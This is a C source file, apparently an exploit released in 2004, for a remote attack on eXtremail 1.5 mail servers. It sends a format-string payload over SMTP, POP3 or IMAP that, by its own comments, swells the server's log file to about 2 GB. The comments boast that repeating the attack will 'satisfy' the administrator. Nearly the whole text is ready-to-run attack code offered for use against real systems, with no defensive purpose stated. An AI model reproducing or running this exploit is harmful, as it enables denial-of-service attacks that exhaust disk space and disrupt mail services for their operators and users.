/**********************************************************
*
* Remote hdd memory leak exploit for eXtremail server v1.5
*
* log file before attack:
* -rw-r--r--    1 root     root         4296 Jun  2 23:11 smtpd20040602.log
*
* log file _after_ attack:
* -rw-r--r--    1 root     root     2147483647 Jun  2 23:39 smtpd20040602.log
*
* attack several times and administrator will be satisfied ;)
* dont worry about ur traffic, u send only ~50 bytes.
*
* greetingz to akula
*
* by over_g / m00 / 2 june 2004
*
**********************************************************/

#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define SMTP 25
#define POP3 110
#define IMAP 143

#define SMTP_T "helo "
#define POP3_T "user "
#define IMAP_T "1 login "

long MYSIZE = 2147483647; //size of trash

void usage(char *pr)
{
  printf("Usage: %s -isp <remote-host>\n\t-i attack IMAP service\n\t-s attack "
	"SMTP service\n\t-p attack POP3 service\n\n",pr);
  exit(1);
}

int main(int argc, char *argv[])
{
 struct hostent *he;
 struct sockaddr_in s_addr;
 int sockfd;
 int PORT;
 int opt;
 char buf[200];
 char buffer[200];
 char *first;
 char *second = "";
 char *host;
 printf("\n\n Remote exploit for eXtremail 1.5.x\n\t by over_g / m00 \n\n");


  if (argc != 3)
   {
	usage(argv[0]);
   }
   while((opt = getopt(argc, argv, "i:s:p:"))!= EOF) {
	switch(opt) {
		case 'i':
			PORT = IMAP;
			first = IMAP_T;
			second = "%%x%%x";
			break;
		case 's':
			PORT = SMTP;
			first = SMTP_T;
			break;
		case 'p':
			PORT = POP3;
			first = POP3_T;
			break;
		default :
			usage(argv[0]);
			 }
		}

  host = argv[2];

  sprintf(buffer,"%s %%.%dx$n %s\n",first,MYSIZE,second);

  if ((he=gethostbyname(host)) == NULL)
     {
      perror("gethostbyname");
      exit(1);
     }

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
      perror("socket");
      exit(1);

     }

 s_addr.sin_family = AF_INET;
 s_addr.sin_port = htons(PORT);
 s_addr.sin_addr = *((struct in_addr *)he->h_addr);

 printf("[+] Connecting to server... ");
 if (connect(sockfd, (struct sockaddr *)&s_addr, sizeof(struct sockaddr)) == -1)
     {
      printf("failed\n");
      exit(1);
     }

 printf("OK\n[+] Receiving banner...");
 if (recv(sockfd, buf, 199, 0) == -1)
     {
      printf("failed\n");
      exit(1);
     }
 printf("OK\n[+] Sending data...");
 send(sockfd,buffer, strlen(buffer), 0);
 printf ("OK\n\n");
 close(sockfd);

}
